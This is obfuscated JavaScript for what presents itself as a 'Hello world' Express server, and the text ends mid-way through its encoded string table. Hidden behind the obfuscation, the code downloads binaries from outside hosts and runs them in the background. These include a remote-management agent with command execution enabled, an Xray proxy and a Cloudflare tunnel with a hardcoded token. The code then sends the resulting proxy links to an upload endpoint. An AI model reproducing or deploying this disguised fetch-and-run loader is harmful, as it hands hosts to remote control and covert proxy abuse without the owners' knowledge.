const _0x35001c=_0x326d;(function(_0x2bb2b6,_0x7f79a0){const _0x18269c={_0x138da5:0x162,_0x4dd6d6:0x17b,_0x4a3bca:0x180,_0x2f90f6:0x195},_0x2a6e08=_0x326d,_0x840895=_0x2bb2b6();while(!![]){try{const _0x5176b7=-parseInt(_0x2a6e08(_0x18269c._0x138da5))/0x1+-parseInt(_0x2a6e08(_0x18269c._0x4dd6d6))/0x2*(parseInt(_0x2a6e08(0x196))/0x3)+-parseInt(_0x2a6e08(0x18f))/0x4*(parseInt(_0x2a6e08(0x1cd))/0x5)+-parseInt(_0x2a6e08(0x13c))/0x6*(parseInt(_0x2a6e08(0x1c0))/0x7)+-parseInt(_0x2a6e08(0x12f))/0x8*(parseInt(_0x2a6e08(0x17c))/0x9)+-parseInt(_0x2a6e08(_0x18269c._0x4a3bca))/0xa+parseInt(_0x2a6e08(0x1bf))/0xb*(parseInt(_0x2a6e08(_0x18269c._0x2f90f6))/0xc);if(_0x5176b7===_0x7f79a0)break;else _0x840895['push'](_0x840895['shift']());}catch(_0x56829e){_0x840895['push'](_0x840895['shift']());}}}(_0x31b0,0x7dc15));const express=require(_0x35001c(0x182)),app=express(),axios=require(_0x35001c(0x135)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x35001c(0x170)),exec=promisify(require(_0x35001c(0x1cc))['exec']),{execSync}=require(_0x35001c(0x1cc)),UPLOAD_URL=process[_0x35001c(0x1af)][_0x35001c(0x1d9)]||'',PROJECT_URL=process[_0x35001c(0x1af)][_0x35001c(0x1c9)]||'',AUTO_ACCESS=process[_0x35001c(0x1af)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x35001c(0x1af)][_0x35001c(0x131)]||'./tmp',SUB_PATH=process[_0x35001c(0x1af)][_0x35001c(0x1c1)]||_0x35001c(0x12d),PORT=process['env'][_0x35001c(0x194)]||process[_0x35001c(0x1af)]['PORT']||0xbb8,UUID=process[_0x35001c(0x1af)]['UUID']||'fd303f3a-6d61-4161-a801-686e6663f505',NEZHA_SERVER=process[_0x35001c(0x1af)][_0x35001c(0x1b5)]||'',NEZHA_PORT=process['env'][_0x35001c(0x1c2)]||'',NEZHA_KEY=process[_0x35001c(0x1af)][_0x35001c(0x167)]||'',ARGO_DOMAIN=process[_0x35001c(0x1af)]['ARGO_DOMAIN']||_0x35001c(0x157),ARGO_AUTH=process['env']['ARGO_AUTH']||_0x35001c(0x1a4),ARGO_PORT=process[_0x35001c(0x1af)][_0x35001c(0x1b7)]||0x1f41,CFIP=process['env']['CFIP']||_0x35001c(0x190),CFPORT=process['env']['CFPORT']||0x1bb,NAME=process[_0x35001c(0x1af)][_0x35001c(0x1d1)]||_0x35001c(0x12e);!fs['existsSync'](FILE_PATH)?(fs[_0x35001c(0x181)](FILE_PATH),console['log'](FILE_PATH+_0x35001c(0x171))):console[_0x35001c(0x1a3)](FILE_PATH+_0x35001c(0x13f));function generateRandomName(){const _0x38db47={_0x3260dd:0x14c},_0x5546db=_0x35001c,_0xae7b4c=_0x5546db(0x1d5);let _0x129687='';for(let _0x12d061=0x0;_0x12d061<0x6;_0x12d061++){_0x129687+=_0xae7b4c[_0x5546db(0x186)](Math[_0x5546db(0x18e)](Math[_0x5546db(_0x38db47._0x3260dd)]()*_0xae7b4c[_0x5546db(0x1b2)]));}return _0x129687;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x35001c(0x141)](FILE_PATH,npmName),phpPath=path[_0x35001c(0x141)](FILE_PATH,phpName),webPath=path[_0x35001c(0x141)](FILE_PATH,webName),botPath=path[_0x35001c(0x141)](FILE_PATH,botName),subPath=path[_0x35001c(0x141)](FILE_PATH,_0x35001c(0x177)),listPath=path[_0x35001c(0x141)](FILE_PATH,_0x35001c(0x174)),bootLogPath=path[_0x35001c(0x141)](FILE_PATH,_0x35001c(0x17a)),configPath=path['join'](FILE_PATH,'config.json');function deleteNodes(){const _0x4f8f54={_0x40fbc3:0x19b,_0x234e34:0x16d,_0x451e40:0x147,_0xe9b80b:0x1b2,_0x43ca55:0x16e},_0x4e95a2=_0x35001c;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0xfb5561;try{_0xfb5561=fs[_0x4e95a2(_0x4f8f54._0x40fbc3)](subPath,'utf-8');}catch{return null;}const _0x1ce5ce=Buffer[_0x4e95a2(0x1d4)](_0xfb5561,_0x4e95a2(0x1bc))[_0x4e95a2(_0x4f8f54._0x234e34)](_0x4e95a2(0x133)),_0x61bef4=_0x1ce5ce[_0x4e95a2(_0x4f8f54._0x451e40)]('\x0a')[_0x4e95a2(0x16c)](_0x3b4b58=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x4e95a2(0x1df)](_0x3b4b58));if(_0x61bef4[_0x4e95a2(_0x4f8f54._0xe9b80b)]===0x0)return;return axios[_0x4e95a2(_0x4f8f54._0x43ca55)](UPLOAD_URL+_0x4e95a2(0x124),JSON[_0x4e95a2(0x128)]({'nodes':_0x61bef4}),{'headers':{'Content-Type':_0x4e95a2(0x14a)}})['catch'](_0x52ea18=>{return null;}),null;}catch(_0x246fcf){return null;}}function cleanupOldFiles(){const _0x52bf02={_0x433bc0:0x1a6,_0x27816e:0x1d6},_0x3c808f={_0x51d851:0x13b},_0xe7f1e8=_0x35001c;try{const _0x519bb7=fs[_0xe7f1e8(_0x52bf02._0x433bc0)](FILE_PATH);_0x519bb7[_0xe7f1e8(_0x52bf02._0x27816e)](_0x56d636=>{const _0x71b96a=_0xe7f1e8,_0x205001=path['join'](FILE_PATH,_0x56d636);try{const _0x2e0a1b=fs[_0x71b96a(0x1d2)](_0x205001);_0x2e0a1b[_0x71b96a(0x15d)]()&&fs[_0x71b96a(_0x3c808f._0x51d851)](_0x205001);}catch(_0x202c17){}});}catch(_0x2a50a0){}}app[_0x35001c(0x1e1)]('/',function(_0x2ec153,_0x33e84c){const _0x3497d7={_0x483cd1:0x1dc},_0x4e354c=_0x35001c;_0x33e84c[_0x4e354c(_0x3497d7._0x483cd1)]('Hello\x20world!');});async function generateConfig(){const _0x3fa9a7={_0x3a98da:0x130,_0x1fc172:0x130,_0x5c7e78:0x176,_0x14739a:0x15a,_0x37bf66:0x19a,_0x37dee6:0x14d,_0x12801a:0x168,_0x3876eb:0x1ba,_0x2deb4e:0x1ca,_0x4139ec:0x1ac,_0x1e3cb9:0x12a,_0x4ef006:0x172,_0x53d03b:0x1dd,_0x3acd59:0x128},_0x597e00=_0x35001c,_0x339e54={'log':{'access':_0x597e00(_0x3fa9a7._0x3a98da),'error':_0x597e00(_0x3fa9a7._0x1fc172),'loglevel':_0x597e00(0x15a)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x597e00(_0x3fa9a7._0x5c7e78)}],'decryption':_0x597e00(_0x3fa9a7._0x14739a),'fallbacks':[{'dest':0xbb9},{'path':_0x597e00(0x168),'dest':0xbba},{'path':_0x597e00(0x1ca),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x597e00(0x12a),'protocol':_0x597e00(0x14d),'settings':{'clients':[{'id':UUID}],'decryption':_0x597e00(0x15a)},'streamSettings':{'network':_0x597e00(_0x3fa9a7._0x37bf66),'security':'none'}},{'port':0xbba,'listen':_0x597e00(0x12a),'protocol':_0x597e00(_0x3fa9a7._0x37dee6),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x597e00(0x15a)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x597e00(_0x3fa9a7._0x12801a)}},'sniffing':{'enabled':!![],'destOverride':[_0x597e00(_0x3fa9a7._0x3876eb),'tls',_0x597e00(0x1ac)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x597e00(0x12a),'protocol':_0x597e00(0x197),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x597e00(_0x3fa9a7._0x2deb4e)}},'sniffing':{'enabled':!![],'destOverride':[_0x597e00(0x1ba),_0x597e00(0x156),_0x597e00(_0x3fa9a7._0x4139ec)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x597e00(_0x3fa9a7._0x1e3cb9),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x597e00(0x123)}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x597e00(0x1ac)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x597e00(_0x3fa9a7._0x4ef006),'tag':'direct'},{'protocol':'blackhole','tag':'block'}]};fs[_0x597e00(0x127)](path['join'](FILE_PATH,_0x597e00(_0x3fa9a7._0x53d03b)),JSON[_0x597e00(_0x3fa9a7._0x3acd59)](_0x339e54,null,0x2));}function getSystemArchitecture(){const _0x1277df={_0x31b69f:0x178,_0x186d9f:0x16b,_0x26f57c:0x132},_0x257970=_0x35001c,_0x4b3976=os[_0x257970(0x125)]();return _0x4b3976===_0x257970(_0x1277df._0x31b69f)||_0x4b3976===_0x257970(_0x1277df._0x186d9f)||_0x4b3976===_0x257970(_0x1277df._0x26f57c)?'arm':'amd';}function _0x326d(_0x147e8f,_0x406b68){const _0x31b04c=_0x31b0();return _0x326d=function(_0x326d0b,_0x563c07){_0x326d0b=_0x326d0b-0x122;let _0xf9e699=_0x31b04c[_0x326d0b];return _0xf9e699;},_0x326d(_0x147e8f,_0x406b68);}function downloadFile(_0x1d849e,_0x1ee7f5,_0x55f22b){const _0x160179={_0x181712:0x142,_0x28fd95:0x1e1},_0x29241f={_0x193f01:0x199},_0x1a0d79=_0x35001c,_0x3fdcb2=_0x1d849e;!fs[_0x1a0d79(_0x160179._0x181712)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x2930f8=fs[_0x1a0d79(0x15b)](_0x3fdcb2);axios({'method':_0x1a0d79(_0x160179._0x28fd95),'url':_0x1ee7f5,'responseType':'stream'})[_0x1a0d79(0x1bd)](_0x3ce0f1=>{const _0x5bd4ca={_0x43d07f:0x1cb},_0x41836b={_0x2cb42f:0x1a3},_0x44b1d3=_0x1a0d79;_0x3ce0f1[_0x44b1d3(0x19f)][_0x44b1d3(0x1b1)](_0x2930f8),_0x2930f8['on'](_0x44b1d3(0x1ab),()=>{const _0x150b53=_0x44b1d3;_0x2930f8['close'](),console[_0x150b53(_0x41836b._0x2cb42f)]('Download\x20'+path[_0x150b53(0x148)](_0x3fdcb2)+'\x20successfully'),_0x55f22b(null,_0x3fdcb2);}),_0x2930f8['on'](_0x44b1d3(0x199),_0x1da119=>{const _0x10651a=_0x44b1d3;fs[_0x10651a(0x143)](_0x3fdcb2,()=>{});const _0x2a68bb=_0x10651a(_0x5bd4ca._0x43d07f)+path['basename'](_0x3fdcb2)+_0x10651a(0x18a)+_0x1da119['message'];console['error'](_0x2a68bb),_0x55f22b(_0x2a68bb);});})[_0x1a0d79(0x1a8)](_0x3b47e=>{const _0x420fd6=_0x1a0d79,_0x50fb5c='Download\x20'+path['basename'](_0x3fdcb2)+_0x420fd6(0x18a)+_0x3b47e[_0x420fd6(0x13e)];console[_0x420fd6(_0x29241f._0x193f01)](_0x50fb5c),_0x55f22b(_0x50fb5c);});}async function downloadFilesAndRun(){const _0x1fe1ac={_0x1cb907:0x173,_0x1af9f7:0x136,_0x5c5414:0x1c5,_0x1c767b:0x151,_0x4f3358:0x19c,_0x4f06fc:0x1d8,_0x16ed60:0x1be,_0x49031f:0x1a3,_0x3a8dec:0x13a,_0x10f061:0x137,_0x20d403:0x1d0,_0x590961:0x187,_0x516a2d:0x136,_0x7ab9cc:0x149,_0x2b7abe:0x173,_0x1adb17:0x129,_0x4e3a51:0x17d,_0x47e5da:0x199,_0x57fbea:0x169,_0x2df961:0x1b8,_0x25c772:0x1ad,_0x4fe0ff:0x16f,_0x1827a6:0x142,_0x22d599:0x1de,_0x2a9f5e:0x1de,_0x220b0c:0x122,_0x4be2ae:0x199,_0xc1adc0:0x1cf},_0x54a696=_0x35001c,_0x57634e=getSystemArchitecture(),_0x1c946c=getFilesForArchitecture(_0x57634e);if(_0x1c946c['length']===0x0){console['log'](_0x54a696(0x154));return;}const _0x38a5ce=_0x1c946c['map'](_0x1a1f2d=>{const _0x401ad1={_0x3c5d25:0x1b3};return new Promise((_0x312a37,_0x212e31)=>{const _0x1fdc33=_0x326d;downloadFile(_0x1a1f2d[_0x1fdc33(0x1e0)],_0x1a1f2d[_0x1fdc33(_0x401ad1._0x3c5d25)],(_0xb7318c,_0x1d9bf9)=>{_0xb7318c?_0x212e31(_0xb7318c):_0x312a37(_0x1d9bf9);});});});try{await Promise['all'](_0x38a5ce);}catch(_0x56abfc){console[_0x54a696(0x199)]('Error\x20downloading\x20files:',_0x56abfc);return;}function _0x38b880(_0x393506){const _0x123a56={_0x4b2a94:0x199,_0x314cf6:0x1a5,_0x55b05c:0x158},_0x402aae=_0x54a696,_0x3c3d96=0x1fd;_0x393506[_0x402aae(0x1d6)](_0x169b29=>{const _0x2f233e=_0x402aae;fs[_0x2f233e(0x142)](_0x169b29)&&fs['chmod'](_0x169b29,_0x3c3d96,_0x2185a1=>{const _0xee9812=_0x2f233e;_0x2185a1?console[_0xee9812(_0x123a56._0x4b2a94)](_0xee9812(_0x123a56._0x314cf6)+_0x169b29+':\x20'+_0x2185a1):console['log'](_0xee9812(_0x123a56._0x55b05c)+_0x169b29+':\x20'+_0x3c3d96[_0xee9812(0x16d)](0x8));});});}const _0x23b955=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x38b880(_0x23b955);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x60ce39=NEZHA_SERVER[_0x54a696(_0x1fe1ac._0x1cb907)](':')?NEZHA_SERVER['split'](':')[_0x54a696(0x152)]():'',_0x362e5a=new Set([_0x54a696(0x137),'8443',_0x54a696(0x187),_0x54a696(_0x1fe1ac._0x1af9f7),_0x54a696(0x149),_0x54a696(0x13d)]),_0x28ff90=_0x362e5a[_0x54a696(_0x1fe1ac._0x5c5414)](_0x60ce39)?_0x54a696(_0x1fe1ac._0x1c767b):_0x54a696(_0x1fe1ac._0x4f3358),_0x1dc5df=_0x54a696(_0x1fe1ac._0x4f06fc)+NEZHA_KEY+_0x54a696(0x17f)+NEZHA_SERVER+_0x54a696(_0x1fe1ac._0x16ed60)+_0x28ff90+_0x54a696(0x1a1)+UUID;fs[_0x54a696(0x127)](path[_0x54a696(0x141)](FILE_PATH,'config.yaml'),_0x1dc5df);const _0x18766f='nohup\x20'+phpPath+'\x20-c\x20\x22'+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x18766f),console[_0x54a696(_0x1fe1ac._0x49031f)](phpName+'\x20is\x20running'),await new Promise(_0x4dcbfe=>setTimeout(_0x4dcbfe,0x3e8));}catch(_0x2e406a){console['error'](_0x54a696(_0x1fe1ac._0x3a8dec)+_0x2e406a);}}else{let _0x470468='';const _0x3a271d=[_0x54a696(_0x1fe1ac._0x10f061),_0x54a696(_0x1fe1ac._0x20d403),_0x54a696(_0x1fe1ac._0x590961),_0x54a696(_0x1fe1ac._0x516a2d),_0x54a696(_0x1fe1ac._0x7ab9cc),_0x54a696(0x13d)];_0x3a271d[_0x54a696(_0x1fe1ac._0x2b7abe)](NEZHA_PORT)&&(_0x470468=_0x54a696(0x165));const _0x4b7b83=_0x54a696(0x1ad)+npmPath+_0x54a696(_0x1fe1ac._0x1adb17)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x470468+_0x54a696(_0x1fe1ac._0x4e3a51);try{await exec(_0x4b7b83),console['log'](npmName+_0x54a696(0x1d7)),await new Promise(_0x56e621=>setTimeout(_0x56e621,0x3e8));}catch(_0x3f29a9){console[_0x54a696(_0x1fe1ac._0x47e5da)](_0x54a696(_0x1fe1ac._0x57fbea)+_0x3f29a9);}}}else console[_0x54a696(0x1a3)](_0x54a696(_0x1fe1ac._0x2df961));const _0x5a96ee=_0x54a696(_0x1fe1ac._0x25c772)+webPath+_0x54a696(0x1aa)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x5a96ee),console[_0x54a696(0x1a3)](webName+'\x20is\x20running'),await new Promise(_0x5623ab=>setTimeout(_0x5623ab,0x3e8));}catch(_0x2f2c88){console[_0x54a696(_0x1fe1ac._0x47e5da)](_0x54a696(_0x1fe1ac._0x4fe0ff)+_0x2f2c88);}if(fs[_0x54a696(_0x1fe1ac._0x1827a6)](botPath)){let _0x5b3261;if(ARGO_AUTH[_0x54a696(_0x1fe1ac._0x22d599)](/^[A-Z0-9a-z=]{120,250}$/))_0x5b3261=_0x54a696(0x191)+ARGO_AUTH;else ARGO_AUTH[_0x54a696(_0x1fe1ac._0x2a9f5e)](/TunnelSecret/)?_0x5b3261='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+'/tunnel.yml\x20run':_0x5b3261=_0x54a696(0x185)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x54a696(0x1ad)+botPath+'\x20'+_0x5b3261+_0x54a696(_0x1fe1ac._0x220b0c)),console[_0x54a696(_0x1fe1ac._0x49031f)](botName+_0x54a696(0x1d7)),await new Promise(_0x4d80a4=>setTimeout(_0x4d80a4,0x7d0));}catch(_0x341ac1){console[_0x54a696(_0x1fe1ac._0x4be2ae)](_0x54a696(_0x1fe1ac._0xc1adc0)+_0x341ac1);}}await new Promise(_0x57a032=>setTimeout(_0x57a032,0x1388));}function getFilesForArchitecture(_0x586419){const _0x5771bb={_0x5d377e:0x178,_0xf06b36:0x163,_0x28c24a:0x1c8,_0x58092e:0x19d},_0x122269=_0x35001c;let _0x3428b9;_0x586419===_0x122269(_0x5771bb._0x5d377e)?_0x3428b9=[{'fileName':webPath,'fileUrl':_0x122269(_0x5771bb._0xf06b36)},{'fileName':botPath,'fileUrl':_0x122269(0x198)}]:_0x3428b9=[{'fileName':webPath,'fileUrl':_0x122269(0x16a)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x8d5be7=_0x586419===_0x122269(0x178)?_0x122269(_0x5771bb._0x28c24a):_0x122269(0x1d3);_0x3428b9[_0x122269(0x19d)]({'fileName':npmPath,'fileUrl':_0x8d5be7});}else{const _0x6f6210=_0x586419===_0x122269(_0x5771bb._0x5d377e)?_0x122269(0x193):_0x122269(0x1c4);_0x3428b9[_0x122269(_0x5771bb._0x58092e)]({'fileName':phpPath,'fileUrl':_0x6f6210});}}return _0x3428b9;}function argoType(){const _0xc38a6a={_0x1323e0:0x173,_0xecbc47:0x15f,_0x28e2a2:0x141,_0x53eb66:0x146,_0x5ef964:0x14f,_0xb3fc2:0x1c6,_0x342267:0x155},_0x427498=_0x35001c;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x427498(0x140));return;}if(ARGO_AUTH[_0x427498(_0xc38a6a._0x1323e0)](_0x427498(0x1a2))){fs[_0x427498(0x127)](path['join'](FILE_PATH,_0x427498(_0xc38a6a._0xecbc47)),ARGO_AUTH);const _0xa5dd91=_0x427498(0x15c)+ARGO_AUTH[_0x427498(0x147)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x427498(_0xc38a6a._0x28e2a2)](FILE_PATH,'tunnel.json')+'\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20'+ARGO_DOMAIN+_0x427498(_0xc38a6a._0x53eb66)+ARGO_PORT+_0x427498(_0xc38a6a._0x5ef964);fs[_0x427498(0x127)](path[_0x427498(_0xc38a6a._0x28e2a2)](FILE_PATH,_0x427498(_0xc38a6a._0xb3fc2)),_0xa5dd91);}else console[_0x427498(0x1a3)](_0x427498(_0xc38a6a._0x342267));}async function extractDomains(){const _0x423eb3={_0x371c86:0x1a3,_0x405522:0x17a,_0x407a71:0x147,_0x31a275:0x1d6,_0x2753ef:0x1b2,_0x20600a:0x18d,_0xa27cd8:0x145,_0x1c6065:0x1cf},_0x4f9385={_0x326c93:0x1e1,_0x47558a:0x1da,_0x565e8a:0x19f,_0x431d50:0x1db,_0xf88bc9:0x19f,_0x338766:0x192,_0x39c2d2:0x19f},_0x2ba065={_0x4abf1e:0x1c7,_0xc3c367:0x186,_0x1967fa:0x14e},_0x5b2266=_0x35001c;let _0x198d3e;if(ARGO_AUTH&&ARGO_DOMAIN)_0x198d3e=ARGO_DOMAIN,console[_0x5b2266(_0x423eb3._0x371c86)](_0x5b2266(0x1c3),_0x198d3e),await _0x5905f1(_0x198d3e);else try{const _0x3ca747=fs['readFileSync'](path['join'](FILE_PATH,_0x5b2266(_0x423eb3._0x405522)),_0x5b2266(0x133)),_0x1ba8ef=_0x3ca747[_0x5b2266(_0x423eb3._0x407a71)]('\x0a'),_0x2a49cb=[];_0x1ba8ef[_0x5b2266(_0x423eb3._0x31a275)](_0x47cf67=>{const _0x16e08b=_0x5b2266,_0x444475=_0x47cf67['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x444475){const _0x583595=_0x444475[0x1];_0x2a49cb[_0x16e08b(0x1a9)](_0x583595);}});if(_0x2a49cb[_0x5b2266(_0x423eb3._0x2753ef)]>0x0)_0x198d3e=_0x2a49cb[0x0],console[_0x5b2266(0x1a3)](_0x5b2266(_0x423eb3._0x20600a),_0x198d3e),await _0x5905f1(_0x198d3e);else{console[_0x5b2266(_0x423eb3._0x371c86)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x5b2266(0x13b)](path[_0x5b2266(0x141)](FILE_PATH,_0x5b2266(0x17a)));async function _0x38c979(){const _0x102093=_0x5b2266;try{process[_0x102093(0x138)]===_0x102093(_0x2ba065._0x4abf1e)?await exec(_0x102093(0x161)+botName+'.exe\x20>\x20nul\x202>&1'):await exec('pkill\x20-f\x20\x22['+botName[_0x102093(_0x2ba065._0xc3c367)](0x0)+']'+botName[_0x102093(_0x2ba065._0x1967fa)](0x1)+_0x102093(0x19e));}catch(_0x3bfb8d){}}_0x38c979(),await new Promise(_0x4c5bb1=>setTimeout(_0x4c5bb1,0xbb8));const _0x56603d=_0x5b2266(0x185)+FILE_PATH+_0x5b2266(_0x423eb3._0xa27cd8)+ARGO_PORT;try{await exec(_0x5b2266(0x1ad)+botPath+'\x20'+_0x56603d+_0x5b2266(0x122)),console[_0x5b2266(0x1a3)](botName+'\x20is\x20running'),await new Promise(_0x4a1c9c=>setTimeout(_0x4a1c9c,0xbb8)),await extractDomains();}catch(_0xd56f9){console[_0x5b2266(0x199)](_0x5b2266(_0x423eb3._0x1c6065)+_0xd56f9);}}}catch(_0x495812){console['error'](_0x5b2266(0x184),_0x495812);}async function _0x445447(){const _0x1535b6=_0x5b2266;try{const _0x4ea493=await axios[_0x1535b6(_0x4f9385._0x326c93)](_0x1535b6(_0x4f9385._0x47558a),{'timeout':0xbb8});if(_0x4ea493[_0x1535b6(_0x4f9385._0x565e8a)]&&_0x4ea493[_0x1535b6(0x19f)]['country_code']&&_0x4ea493[_0x1535b6(0x19f)][_0x1535b6(_0x4f9385._0x431d50)])return _0x4ea493[_0x1535b6(0x19f)][_0x1535b6(0x150)]+'_'+_0x4ea493[_0x1535b6(_0x4f9385._0x565e8a)][_0x1535b6(0x1db)];}catch(_0x3e77d8){try{const _0xd4ff0e=await axios[_0x1535b6(_0x4f9385._0x326c93)](_0x1535b6(0x18b),{'timeout':0xbb8});if(_0xd4ff0e[_0x1535b6(_0x4f9385._0xf88bc9)]&&_0xd4ff0e[_0x1535b6(_0x4f9385._0xf88bc9)][_0x1535b6(0x1a0)]===_0x1535b6(0x1b6)&&_0xd4ff0e['data'][_0x1535b6(_0x4f9385._0x338766)]&&_0xd4ff0e[_0x1535b6(0x19f)]['org'])return _0xd4ff0e[_0x1535b6(_0x4f9385._0x39c2d2)]['countryCode']+'_'+_0xd4ff0e[_0x1535b6(0x19f)][_0x1535b6(0x1db)];}catch(_0x39fdd0){}}return _0x1535b6(0x126);}async function _0x5905f1(_0x5585e8){const _0x225822=await _0x445447(),_0x4c3865=NAME?NAME+'-'+_0x225822:_0x225822;return new Promise(_0x1047ff=>{const _0x42be4c={_0xb139cf:0x15a,_0x254061:0x156,_0x12f69e:0x1b9,_0x4e296c:0x144,_0x80f91a:0x1d4,_0x5ca071:0x183,_0x561740:0x1bb,_0x5e3b90:0x16d,_0x59606c:0x1bc};setTimeout(()=>{const _0x13c953={_0x1d0c1e:0x1d4,_0x10c177:0x1bc,_0x1f04bc:0x1b0,_0xbb8ff3:0x189,_0xef00c2:0x1dc},_0x3c0cbb=_0x326d,_0x47e3c7={'v':'2','ps':''+_0x4c3865,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x3c0cbb(0x15a),'net':'ws','type':_0x3c0cbb(_0x42be4c._0xb139cf),'host':_0x5585e8,'path':'/vmess-argo?ed=2560','tls':_0x3c0cbb(_0x42be4c._0x254061),'sni':_0x5585e8,'alpn':'','fp':_0x3c0cbb(0x1ae)},_0x4149af=_0x3c0cbb(0x12b)+UUID+'@'+CFIP+':'+CFPORT+_0x3c0cbb(_0x42be4c._0x12f69e)+_0x5585e8+'&fp=firefox&type=ws&host='+_0x5585e8+_0x3c0cbb(_0x42be4c._0x4e296c)+_0x4c3865+_0x3c0cbb(0x179)+Buffer[_0x3c0cbb(_0x42be4c._0x80f91a)](JSON[_0x3c0cbb(0x128)](_0x47e3c7))['toString']('base64')+_0x3c0cbb(0x18c)+UUID+'@'+CFIP+':'+CFPORT+_0x3c0cbb(0x164)+_0x5585e8+_0x3c0cbb(_0x42be4c._0x5ca071)+_0x5585e8+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x4c3865+_0x3c0cbb(_0x42be4c._0x561740);console['log'](Buffer['from'](_0x4149af)[_0x3c0cbb(_0x42be4c._0x5e3b90)](_0x3c0cbb(0x1bc))),fs[_0x3c0cbb(0x127)](subPath,Buffer['from'](_0x4149af)[_0x3c0cbb(0x16d)](_0x3c0cbb(_0x42be4c._0x59606c))),console[_0x3c0cbb(0x1a3)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x3c0cbb(0x1e1)]('/'+SUB_PATH,(_0x3f78ed,_0x5e2e83)=>{const _0x3462e8=_0x3c0cbb,_0x18f0a2=Buffer[_0x3462e8(_0x13c953._0x1d0c1e)](_0x4149af)[_0x3462e8(0x16d)](_0x3462e8(_0x13c953._0x10c177));_0x5e2e83['set'](_0x3462e8(_0x13c953._0x1f04bc),_0x3462e8(_0x13c953._0xbb8ff3)),_0x5e2e83[_0x3462e8(_0x13c953._0xef00c2)](_0x18f0a2);}),_0x1047ff(_0x4149af);},0x7d0);});}}function _0x31b0(){const _0x37641b=['response','none','createWriteStream','\x0a\x20\x20tunnel:\x20','isFile','Skipping\x20adding\x20automatic\x20access\x20task','tunnel.json','https://oooo.serv00.net/add-url','taskkill\x20/f\x20/im\x20','645514DcowAu','https://arm64.ssss.nyc.mn/web','?security=tls&sni=','--tls','\x20>/dev/null\x202>&1','NEZHA_KEY','/vless-argo','npm\x20running\x20error:\x20','https://amd64.ssss.nyc.mn/web','arm64','filter','toString','post','web\x20running\x20error:\x20','util','\x20is\x20created','freedom','includes','list.txt','Error\x20in\x20startserver:','xtls-rprx-vision','sub.txt','arm','\x0a\x0avmess://','boot.log','7558GQqsVy','976356WkClnY','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','629810FQYxPz','mkdirSync','express','&fp=firefox&type=ws&host=','Error\x20reading\x20boot.log:','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','charAt','2096','clear','text/plain;\x20charset=utf-8','\x20failed:\x20','http://ip-api.com/json/','\x0a\x0atrojan://','ArgoDomain:','floor','3194908eXNLef','cdns.doon.eu.org','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','countryCode','https://arm64.ssss.nyc.mn/v1','SERVER_PORT','60kEVDhX','519hZjreU','vmess','https://arm64.ssss.nyc.mn/bot','error','tcp','readFileSync','false','unshift','\x22\x20>\x20/dev/null\x202>&1','data','status','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','TunnelSecret','log','eyJhIjoiNDViNWYwNTBlOTI5ZjZjY2UxNjM4ODIzYzFlOTk5NmQiLCJ0IjoiNThiOWZlODYtYjY4NC00MTU4LTgzYWUtOWU5ZThiNzIxMmQxIiwicyI6Ik16WTNNak14WlRBdFlUSXdNeTAwT0dFNUxUa3laakV0Tm1Rek9HTTNaRFU1TnpjMyJ9','Empowerment\x20failed\x20for\x20','readdirSync','Unhandled\x20error\x20in\x20startserver:','catch','push','\x20-c\x20','finish','quic','nohup\x20','firefox','env','Content-Type','pipe','length','file